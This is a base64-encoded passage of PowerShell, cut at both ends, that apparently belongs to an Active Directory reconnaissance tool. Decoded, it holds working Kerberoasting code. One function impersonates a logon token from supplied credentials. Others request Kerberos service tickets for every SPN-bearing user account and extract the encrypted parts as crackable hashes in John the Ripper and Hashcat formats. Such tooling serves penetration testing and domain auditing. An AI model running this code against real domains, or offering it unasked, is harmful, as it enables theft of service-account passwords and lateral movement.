JrQ3JlZGVudGlhbCgpCiAgICAgICAgJFVzZXJEb21haW4gPSAkTmV0d29ya0NyZWRlbnRpYWwuRG9tYWluCiAgICAgICAgSWYgKC1Ob3QgJFVzZXJEb21haW4pCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUlVzZXJJbXBlcnNvbmF0aW9uXSBVc2UgY3JlZGVudGlhbCB3aXRoIERvbWFpbiBGUUROLiAoPERvbWFpbiBGUUROPlw8VXNlcm5hbWU+KSIKICAgICAgICB9CiAgICAgICAgJFVzZXJOYW1lID0gJE5ldHdvcmtDcmVkZW50aWFsLlVzZXJOYW1lCiAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJVc2VySW1wZXJzb25hdGlvbl0gRXhlY3V0aW5nIExvZ29uVXNlcigpIHdpdGggdXNlcjogJCgkVXNlckRvbWFpbilcJCgkVXNlck5hbWUpIgoKICAgICAgICAjIExPR09OMzJfTE9HT05fTkVXX0NSRURFTlRJQUxTID0gOSwgTE9HT04zMl9QUk9WSURFUl9XSU5OVDUwID0gMwogICAgICAgICMgICB0aGlzIGlzIHRvIHNpbXVsYXRlICJydW5hcy5leGUgL25ldG9ubHkiIGZ1bmN0aW9uYWxpdHkKICAgICAgICAkUmVzdWx0ID0gJEFkdmFwaTMyOjpMb2dvblVzZXIoJFVzZXJOYW1lLCAkVXNlckRvbWFpbiwgJE5ldHdvcmtDcmVkZW50aWFsLlBhc3N3b3JkLCA5LCAzLCBbcmVmXSRMb2dvblRva2VuSGFuZGxlKQogICAgICAgICRMYXN0RXJyb3IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpOwoKICAgICAgICBJZiAoLW5vdCAkUmVzdWx0KQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIltHZXQtQURSVXNlckltcGVyc29uYXRpb25dIExvZ29uVXNlcigpIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgICAgIH0KICAgIH0KCiAgICAjIGFjdHVhbGx5IGltcGVyc29uYXRlIHRoZSB0b2tlbiBmcm9tIExvZ29uVXNlcigpCiAgICAkUmVzdWx0ID0gJEFkdmFwaTMyOjpJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlcigkTG9nb25Ub2tlbkhhbmRsZSkKCiAgICBJZiAoLW5vdCAkUmVzdWx0KQogICAgewogICAgICAgIHRocm93ICJbR2V0LUFEUlVzZXJJbXBlcnNvbmF0aW9uXSBJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlcigpIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgfQoKICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtQURSLVVzZXJJbXBlcnNvbmF0aW9uXSBBbHRlcm5hdGUgY3JlZGVudGlhbHMgc3VjY2Vzc2Z1bGx5IGltcGVyc29uYXRlZCIKICAgICRMb2dvblRva2VuSGFuZGxlCn0KCiMgTW9kaWZpZWQgSW52b2tlLVJldmVydFRvU2VsZiBmdW5jdGlvbiBmcm9tIGh0dHBzOi8vZ2l0aHViLmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvYmxvYi9kZXYvUmVjb24vUG93ZXJWaWV3LnBzMQpGdW5jdGlvbiBHZXQtQURSUmV2ZXJ0VG9TZWxmCnsKPCMKLlNZTk9QU0lTCgpSZXZlcnRzIGFueSB0b2tlbiBpbXBlcnNvbmF0aW9uLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZQpSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IFBTUmVmbGVjdAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHVzZXMgUmV2ZXJ0VG9TZWxmKCkgdG8gcmV2ZXJ0IGFueSBpbXBlcnNvbmF0ZWQgdG9rZW5zLgpJZiAtVG9rZW5IYW5kbGUgaXMgcGFzc2VkICh0aGUgdG9rZW4gaGFuZGxlIHJldHVybmVkIGJ5IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiksCkNsb3NlSGFuZGxlKCkgaXMgdXNlZCB0byBjbG9zZSB0aGUgb3BlbmVkIGhhbmRsZS4KCi5QQVJBTUVURVIgVG9rZW5IYW5kbGUKCkFuIG9wdGlvbmFsIEludFB0ciBUb2tlbkhhbmRsZSByZXR1cm5lZCBieSBJbnZva2UtVXNlckltcGVyc29uYXRpb24uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKJFRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkCkludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRUb2tlbgojPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkVG9rZW5IYW5kbGUKICAgICkKCiAgICBJZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb2tlbkhhbmRsZSddKQogICAgewogICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSUmV2ZXJ0VG9TZWxmXSBSZXZlcnRpbmcgdG9rZW4gaW1wZXJzb25hdGlvbiBhbmQgY2xvc2luZyBMb2dvblVzZXIoKSB0b2tlbiBoYW5kbGUiCiAgICAgICAgJFJlc3VsdCA9ICRLZXJuZWwzMjo6Q2xvc2VIYW5kbGUoJFRva2VuSGFuZGxlKQogICAgfQoKICAgICRSZXN1bHQgPSAkQWR2YXBpMzI6OlJldmVydFRvU2VsZigpCiAgICAkTGFzdEVycm9yID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKTsKCiAgICBJZiAoLW5vdCAkUmVzdWx0KQogICAgewogICAgICAgIFdyaXRlLUVycm9yICJbR2V0LUFEUlJldmVydFRvU2VsZl0gUmV2ZXJ0VG9TZWxmKCkgRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcikuTWVzc2FnZSkiCiAgICB9CgogICAgV3JpdGUtVmVyYm9zZSAiW0dldC1BRFJSZXZlcnRUb1NlbGZdIFRva2VuIGltcGVyc29uYXRpb24gc3VjY2Vzc2Z1bGx5IHJldmVydGVkIgp9CgojIE1vZGlmaWVkIEdldC1Eb21haW5TUE5UaWNrZXQgZnVuY3Rpb24gZnJvbSBodHRwczovL2dpdGh1Yi5jb20vUG93ZXJTaGVsbE1hZmlhL1Bvd2VyU3Bsb2l0L2Jsb2IvZGV2L1JlY29uL1Bvd2VyVmlldy5wczEKRnVuY3Rpb24gR2V0LUFEUlNQTlRpY2tldAp7CjwjCjwjCi5TWU5PUFNJUwogICAgUmVxdWVzdCB0aGUga2VyYmVyb3MgdGlja2V0IGZvciBhIHNwZWNpZmllZCBzZXJ2aWNlIHByaW5jaXBhbCBuYW1lIChTUE4pLgoKICAgIEF1dGhvcjogbWFjaG9zZWMsIFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkKICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYKCi5ERVNDUklQVElPTgogICAgVGhpcyBmdW5jdGlvbiB3aWxsIGVpdGhlciB0YWtlIG9uZSBTUE4gc3RyaW5ncywgYW5kIHdpbGwgcmVxdWVzdCBhIGtlcmJlcm9zIHRpY2tldCBmb3IgdGhlIGdpdmVuIFNQTiB1c2luZyBTeXN0ZW0uSWRlbnRpdHlNb2RlbC5Ub2tlbnMuS2VyYmVyb3NSZXF1ZXN0b3JTZWN1cml0eVRva2VuLiBUaGUgZW5jcnlwdGVkIHBvcnRpb24gb2YgdGhlIHRpY2tldCBpcyB0aGVuIGV4dHJhY3RlZCBhbmQgb3V0cHV0IGluIGVpdGhlciBjcmFja2FibGUgSGFzaGNhdCBmb3JtYXQuCgouUEFSQU1FVEVSIFVzZXJTUE4KICAgIFtzdHJpbmddCiAgICBTZXJ2aWNlIFByaW5jaXBhbCBOYW1lLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFVzZXJTUE4KICAgICkKCiAgICBUcnkKICAgIHsKICAgICAgICAkTnVsbCA9IFtSZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgnU3lzdGVtLklkZW50aXR5TW9kZWwnKQogICAgICAgICRUaWNrZXQgPSBOZXctT2JqZWN0IFN5c3RlbS5JZGVudGl0eU1vZGVsLlRva2Vucy5LZXJiZXJvc1JlcXVlc3RvclNlY3VyaXR5VG9rZW4gLUFyZ3VtZW50TGlzdCAkVXNlclNQTgogICAgfQogICAgQ2F0Y2gKICAgIHsKICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUlNQTlRpY2tldF0gRXJyb3IgcmVxdWVzdGluZyB0aWNrZXQgZm9yIFNQTiAkVXNlclNQTiIKICAgICAgICBXcml0ZS1XYXJuaW5nICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICBSZXR1cm4gJG51bGwKICAgIH0KCiAgICBJZiAoJFRpY2tldCkKICAgIHsKICAgICAgICAkVGlja2V0Qnl0ZVN0cmVhbSA9ICRUaWNrZXQuR2V0UmVxdWVzdCgpCiAgICB9CgogICAgSWYgKCRUaWNrZXRCeXRlU3RyZWFtKQogICAgewogICAgICAgICRUaWNrZXRIZXhTdHJlYW0gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRUaWNrZXRCeXRlU3RyZWFtKSAtcmVwbGFjZSAnLScKCiAgICAgICAgIyBUaWNrZXRIZXhTdHJlYW0gPT0gR1NTLUFQSSBGcmFtZSAoc2VlIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmM0MTIxI3NlY3Rpb24tNC4xKQogICAgICAgICMgTm8gZWFzeSB3YXkgdG8gcGFyc2UgQVNOMSwgc28gd2UnbGwgdHJ5IHNvbWUgamFua3kgcmVnZXggdG8gcGFyc2UgdGhlIGVtYmVkZGVkIEtSQl9BUF9SRVEuVGlja2V0IG9iamVjdAogICAgICAgIElmICgkVGlja2V0SGV4U3RyZWFtIC1tYXRjaCAnYTM4Mi4uLi4zMDgyLi4uLkEwMDMwMjAxKD88RXR5cGVMZW4+Li4pQTEuezEsNH0uLi4uLi4uQTI4Mig/PENpcGhlclRleHRMZW4+Li4uLikuLi4uLi4uLig/PERhdGFUb0VuZD4uKyknKQogICAgICAgIHsKICAgICAgICAgICAgJEV0eXBlID0gW0NvbnZlcnRdOjpUb0J5dGUoICRNYXRjaGVzLkV0eXBlTGVuLCAxNiApCiAgICAgICAgICAgICRDaXBoZXJUZXh0TGVuID0gW0NvbnZlcnRdOjpUb1VJbnQzMigkTWF0Y2hlcy5DaXBoZXJUZXh0TGVuLCAxNiktNAogICAgICAgICAgICAkQ2lwaGVyVGV4dCA9ICRNYXRjaGVzLkRhdGFUb0VuZC5TdWJzdHJpbmcoMCwkQ2lwaGVyVGV4dExlbioyKQoKICAgICAgICAgICAgIyBNYWtlIHN1cmUgdGhlIG5leHQgZmllbGQgbWF0Y2hlcyB0aGUgYmVnaW5uaW5nIG9mIHRoZSBLUkJfQVBfUkVRLkF1dGhlbnRpY2F0b3Igb2JqZWN0CiAgICAgICAgICAgIElmICgkTWF0Y2hlcy5EYXRhVG9FbmQuU3Vic3RyaW5nKCRDaXBoZXJUZXh0TGVuKjIsIDQpIC1uZSAnQTQ4MicpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgJ1tHZXQtQURSU1BOVGlja2V0XSBFcnJvciBwYXJzaW5nIGNpcGhlcnRleHQgZm9yIHRoZSBTUE4gICQoJFRpY2tldC5TZXJ2aWNlUHJpbmNpcGFsTmFtZSkuJyAjIFVzZSB0aGUgVGlja2V0Qnl0ZUhleFN0cmVhbSBmaWVsZCBhbmQgZXh0cmFjdCB0aGUgaGFzaCBvZmZsaW5lIHdpdGggR2V0LUtlcmJlcm9hc3RIYXNoRnJvbUFQUmVxCiAgICAgICAgICAgICAgICAkSGFzaCA9ICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgRWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSGFzaCA9ICIkKCRDaXBoZXJUZXh0LlN1YnN0cmluZygwLDMyKSlgJCQoJENpcGhlclRleHQuU3Vic3RyaW5nKDMyKSkiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgRWxzZQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJTUE5UaWNrZXRdIFVuYWJsZSB0byBwYXJzZSB0aWNrZXQgc3RydWN0dXJlIGZvciB0aGUgU1BOICAkKCRUaWNrZXQuU2VydmljZVByaW5jaXBhbE5hbWUpLiIgIyBVc2UgdGhlIFRpY2tldEJ5dGVIZXhTdHJlYW0gZmllbGQgYW5kIGV4dHJhY3QgdGhlIGhhc2ggb2ZmbGluZSB3aXRoIEdldC1LZXJiZXJvYXN0SGFzaEZyb21BUFJlcQogICAgICAgICAgICAkSGFzaCA9ICRudWxsCiAgICAgICAgfQogICAgfQogICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiU2VydmljZVByaW5jaXBhbE5hbWUiIC1WYWx1ZSAkVGlja2V0LlNlcnZpY2VQcmluY2lwYWxOYW1lCiAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkV0eXBlIiAtVmFsdWUgJEV0eXBlCiAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkhhc2giIC1WYWx1ZSAkSGFzaAogICAgUmV0dXJuICRPYmoKfQoKRnVuY3Rpb24gR2V0LUFEUktlcmJlcm9hc3QKewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgYWxsIHVzZXIgc2VydmljZSBwcmluY2lwYWwgbmFtZSAoU1BOKSBoYXNoZXMgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLkRFU0NSSVBUSU9OCiAgICBSZXR1cm5zIGFsbCB1c2VyIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWUgKFNQTikgaGFzaGVzIGluIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgQ3JlZGVudGlhbHMuCgouUEFSQU1FVEVSIFBhZ2VTaXplCiAgICBbaW50XQogICAgVGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LiBEZWZhdWx0IDIwMC4KCi5PVVRQVVRTCiAgICBQU09iamVjdC4KIz4KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRQcm90b2NvbCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0gJG9iakRvbWFpbiwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtpbnRdICRQYWdlU2l6ZQogICAgKQoKICAgIElmICgkQ3JlZGVudGlhbCAtbmUgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkKICAgIHsKICAgICAgICAkTG9nb25Ub2tlbiA9IEdldC1BRFJVc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgfQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdBRFdTJykKICAgIHsKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRFVzZXJzID0gR2V0LUFET2JqZWN0IC1MREFQRmlsdGVyICIoJighb2JqZWN0Q2xhc3M9Y29tcHV0ZXIpKHNlcnZpY2VQcmluY2lwYWxOYW1lPSopKCF1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9MikpIiAtUHJvcGVydGllcyBzQU1BY2NvdW50TmFtZSxzZXJ2aWNlUHJpbmNpcGFsTmFtZSxEaXN0aW5ndWlzaGVkTmFtZSAtUmVzdWx0UGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUktlcmJlcm9hc3RdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIFVzZXJTUE4gT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgSWYgKCRBRFVzZXJzKQogICAgICAgIHsKICAgICAgICAgICAgJFVzZXJTUE5PYmogPSBAKCkKICAgICAgICAgICAgJEFEVXNlcnMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBGb3JFYWNoICgkVXNlclNQTiBpbiAkXy5zZXJ2aWNlUHJpbmNpcGFsTmFtZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVXNlcm5hbWUiIC1WYWx1ZSAkXy5zQU1BY2NvdW50TmFtZQogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiU2VydmljZVByaW5jaXBhbE5hbWUiIC1WYWx1ZSAkVXNlclNQTgoKICAgICAgICAgICAgICAgICAgICAkSGFzaE9iaiA9IEdldC1BRFJTUE5UaWNrZXQgJFVzZXJTUE4KICAgICAgICAgICAgICAgICAgICBJZiAoJEhhc2hPYmopCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICRfLkRpc3Rpbmd1aXNoZWROYW1lLlN1YlN0cmluZygkXy5EaXN0aW5ndWlzaGVkTmFtZS5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICAjIEpvaG5UaGVSaXBwZXIgb3V0cHV0IGZvcm1hdAogICAgICAgICAgICAgICAgICAgICAgICAkSlRSSGFzaCA9ICJgJGtyYjV0Z3NgJCQoJEhhc2hPYmouU2VydmljZVByaW5jaXBhbE5hbWUpOiQoJEhhc2hPYmouSGFzaCkiCiAgICAgICAgICAgICAgICAgICAgICAgICMgaGFzaGNhdCBvdXRwdXQgZm9ybWF0CiAgICAgICAgICAgICAgICAgICAgICAgICRIYXNoY2F0SGFzaCA9ICJgJGtyYjV0Z3NgJCQoJEhhc2hPYmouRXR5cGUpYCQqJCgkXy5TYW1BY2NvdW50TmFtZSlgJCRVc2VyRG9tYWluYCQkKCRIYXNoT2JqLlNlcnZpY2VQcmluY2lwYWxOYW1lKSpgJCQoJEhhc2hPYmouSGFzaCkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRKVFJIYXNoID0gJG51bGwKICAgICAgICAgICAgICAgICAgICAgICAgJEhhc2hjYXRIYXNoID0gJG51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJKb2huIiAtVmFsdWUgJEpUUkhhc2gKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkhhc2hjYXQiIC1WYWx1ZSAkSGFzaGNhdEhhc2gKICAgICAgICAgICAgICAgICAgICAkVXNlclNQTk9iaiArPSAkT2JqCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEVXNlcnMKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0xEQVAnKQogICAgewogICAgICAgICRvYmpTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyICRvYmpEb21haW4KICAgICAgICAkT2JqU2VhcmNoZXIuUGFnZVNpemUgPSAkUGFnZVNpemUKICAgICAgICAkT2JqU2VhcmNoZXIuRmlsdGVyID0gIigmKCFvYmplY3RDbGFzcz1jb21wdXRlcikoc2VydmljZVByaW5jaXBhbE5hbWU9KikoIXVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yKSkiCiAgICAgICAgJE9ialNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCJkaXN0aW5ndWlzaGVkbmFtZSIsInNhbWFjY291bnRuYW1lIiwic2VydmljZXByaW5jaXBhbG5hbWUiLCJ1c2VyYWNjb3VudGNvbnRyb2wiKSkKICAgICAgICAkT2JqU2VhcmNoZXIuU2VhcmNoU2NvcGUgPSAiU3VidHJlZSIKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRFVzZXJzID0gJE9ialNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJLZXJiZXJvYXN0XSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBVc2VyU1BOIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBJZiAoJEFEVXNlcnMpCiAgICAgICAgewogICAgICAgICAgICAkVXNlclNQTk9iaiA9IEAoKQogICAgICAgICAgICAkQURVc2VycyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIEZvckVhY2ggKCRVc2VyU1BOIGluICRfLlByb3BlcnRpZXMuc2VydmljZXByaW5jaXBhbG5hbWUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlVzZXJuYW1lIiAtVmFsdWUgJF8uUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZVswXQogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiU2VydmljZVByaW5jaXBhbE5hbWUiIC1WYWx1ZSAkVXNlclNQTgoKICAgICAgICAgICAgICAgICAgICAkSGFzaE9iaiA9IEdldC1BRFJTUE5UaWNrZXQgJFVzZXJTUE4KICAgICAgICAgICAgICAgICAgICBJZiAoJEhhc2hPYmopCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWVbMF0uU3ViU3RyaW5nKCRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWVbMF0uSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgIyBKb2huVGhlUmlwcGVyIG91dHB1dCBmb3JtYXQKICAgICAgICAgICAgICAgICAgICAgICAgJEpUUkhhc2ggPSAiYCRrcmI1dGdzYCQkKCRIYXNoT2JqLlNlcnZpY2VQcmluY2lwYWxOYW1lKTokKCRIYXNoT2JqLkhhc2gpIgogICAgICAgICAgICAgICAgICAgICAgICAjIGhhc2hjYXQgb3V0cHV0IGZvcm1hdAogICAgICAgICAgICAgICAgICAgICAgICAkSGFzaGNhdEhhc2ggPSAiYCRrcmI1dGdzYCQkKCRIYXNoT2JqLkV0eXBlKWAkKiQoJF8uUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSlgJCRVc2VyRG9tYWluYCQkKCRIYXNoT2JqLlNlcnZpY2VQcmluY2lwYWxOYW1lKSpgJCQoJEhhc2hPYmouSGFzaCkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRKVFJIYXNoID0gJG51bGwKICAgICAgICAgICAgICAgICAgICAgICAgJEhhc2hjYXRIYXNoID0gJG51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJKb2huIiAtVmFsdWUgJEpUUkhhc2gKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkhhc2hjYXQiIC1WYWx1ZSAkSGFzaGNhdEhhc2gKICAgICAgICAgICAgICAgICAgICAkVXNlclNQTk9iaiArPSAkT2JqCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEVXNlcnMKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRMb2dvblRva2VuKQogICAgewogICAgICAgIEdldC1BRFJSZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICB9CgogICAgSWYgKCRVc2VyU1BOT2JqKQogICAgewogICAgICAgIFJldHVybiAkVXNlclNQTk9iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgojIGJhc2VkIG9uIGh0dHBzOi8vZ2FsbGVyeS50ZWNobmV0Lm1pY3Jvc29mdC5jb20vc2NyaXB0Y2VudGVyL1Bvd2VyU2hlbGwtc2NyaXB0LXRvLWZpbmQtNmZjMTVlY2IKRnVuY3Rpb24gR2V0LUFEUkRvbWFpbkFjY291bnRzdXNlZGZvclNlcnZpY2VMb2dvbgp7CjwjCi5TWU5PUFNJUwogICAgUmV0dXJucyBhbGwgYWNjb3VudHMgdXNlZCBieSBzZXJ2aWNlcyBvbiBjb21wdXRlcnMgaW4gYW4gQWN0aXZlIE